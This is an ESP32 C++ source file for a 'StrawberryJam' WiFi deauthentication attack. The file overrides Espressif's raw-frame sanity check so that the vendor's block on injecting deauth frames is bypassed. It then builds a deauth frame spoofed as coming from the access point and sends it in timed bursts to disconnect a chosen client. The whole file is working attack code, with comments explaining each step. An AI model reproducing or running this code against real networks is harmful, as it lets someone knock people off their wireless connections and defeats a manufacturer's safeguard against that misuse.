#include "StrawberryJam.h"

// ─── Override ESP-IDF raw frame sanity check ────────────────────────────────
// Espressif patched libnet80211.a (even in IDF 4.4.x) to reject management
// frames like deauth (0xC0) and disassoc (0xA0) in ieee80211_raw_frame_sanity_check().
// This weak-symbol override bypasses that filter, allowing esp_wifi_80211_tx()
// to send any valid 802.11 frame.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;  // 0 = frame OK, skip the type filter
}

// ─── 802.11 Deauthentication Frame Template (26 bytes) ──────────────────────
// This is a standard WiFi management frame. Every WiFi device understands it.
// The AP normally sends this to gracefully disconnect a client.
// We construct it manually and inject it using esp_wifi_80211_tx().
//
// Reference: IEEE 802.11-2016, Section 9.3.3.1 (Deauthentication frame format)

static uint8_t deauth_frame[26] = {
    // ── Frame Control (2 bytes) ──
    0xC0, 0x00,             // Type: Management (00), Subtype: Deauthentication (1100)
                            // Protocol version: 0, To DS: 0, From DS: 0

    // ── Duration (2 bytes) ──
    0x00, 0x00,             // Duration/ID — set to 0 (immediate)

    // ── Address 1: Destination MAC (6 bytes) — filled at runtime ──
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // [4-9] target client

    // ── Address 2: Source MAC (6 bytes) — filled at runtime ──
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // [10-15] spoofed as AP BSSID

    // ── Address 3: BSSID (6 bytes) — filled at runtime ──
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // [16-21] AP BSSID

    // ── Sequence Control (2 bytes) ──
    0x00, 0x00,             // Sequence number (auto-incremented)

    // ── Reason Code (2 bytes) ──
    0x07, 0x00              // Reason 7: "Class 3 frame received from
                            // non-associated station" — this is the most
                            // common reason code used in deauth attacks.
};

// ─── Constructor ─────────────────────────────────────────────────────────────

StrawberryJam::StrawberryJam()
    : _running(false), _framesSent(0), _lastBurst(0) {
    memset(_bssid, 0, 6);
    memset(_client, 0, 6);
    _channel = 1;
}

// ─── Send a single burst of deauth frames ───────────────────────────────────
// Returns how many frames were successfully transmitted.
//
// How esp_wifi_80211_tx() works:
//   - Takes a raw 802.11 frame buffer and sends it over the air
//   - The ESP32 must be in promiscuous mode OR AP mode
//   - WIFI_IF_AP is used because it allows sending management frames
//   - Returns ESP_OK on success

int StrawberryJam::sendDeauth(const uint8_t bssid[6], const uint8_t client[6], uint8_t channel) {
    // NOTE: In AP_STA mode the STA association locks the radio channel.
    // esp_wifi_set_channel() silently fails while STA is connected.
    // We skip the channel switch — frames go out on the STA's current channel,
    // which matches the AP we're connected to (the likely target).

    // Fill in the frame template with the target addresses:
    // Address 1 (destination) = the client we want to disconnect
    memcpy(&deauth_frame[4], client, 6);

    // Address 2 (source) = the AP's BSSID (spoofed — client thinks AP sent this)
    memcpy(&deauth_frame[10], bssid, 6);

    // Address 3 (BSSID) = the AP's BSSID
    memcpy(&deauth_frame[16], bssid, 6);

    int sent = 0;

    // Send multiple frames per burst for reliability.
    for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
        // Increment sequence number (bits [15:4]), not fragment number (bits [3:0])
        uint16_t seqCtrl = (deauth_frame[23] << 8) | deauth_frame[22];
        seqCtrl += 0x10;
        deauth_frame[22] = seqCtrl & 0xFF;
        deauth_frame[23] = (seqCtrl >> 8) & 0xFF;

        esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if (result == ESP_OK) {
            sent++;
        } else {
            Serial.print(F("[JAM] TX fail err=0x"));
            Serial.println(result, HEX);
        }
    }

    if (sent > 0 && _framesSent == 0) {
        Serial.println(F("[JAM] First burst transmitted OK!"));
    }

    _framesSent += sent;
    return sent;
}

// ─── Continuous attack control ──────────────────────────────────────────────

void StrawberryJam::startAttack(const uint8_t bssid[6], const uint8_t client[6], uint8_t channel) {
    memcpy(_bssid, bssid, 6);
    memcpy(_client, client, 6);
    _channel = channel;
    _running = true;
    _lastBurst = 0;
    _framesSent = 0;

    Serial.println(F("=== STRAWBERRY JAM ACTIVE ==="));
    Serial.print(F("Target: "));
    Serial.println(WiFiSniffer::macToString(client));
    Serial.print(F("BSSID:  "));
    Serial.println(WiFiSniffer::macToString(bssid));
    Serial.print(F("Channel: "));
    Serial.println(channel);
}

void StrawberryJam::stopAttack() {
    _running = false;
    Serial.println(F("=== STRAWBERRY JAM STOPPED ==="));
    Serial.print(F("Total frames sent: "));
    Serial.println(_framesSent);
}

bool StrawberryJam::isRunning() {
    return _running;
}

// ─── Call from loop() — sends periodic deauth bursts ────────────────────────

void StrawberryJam::update() {
    if (!_running) return;

    if (millis() - _lastBurst >= DEAUTH_BURST_DELAY) {
        sendDeauth(_bssid, _client, _channel);
        _lastBurst = millis();
    }
}

// ─── Stats ──────────────────────────────────────────────────────────────────

unsigned long StrawberryJam::getFramesSent() {
    return _framesSent;
}
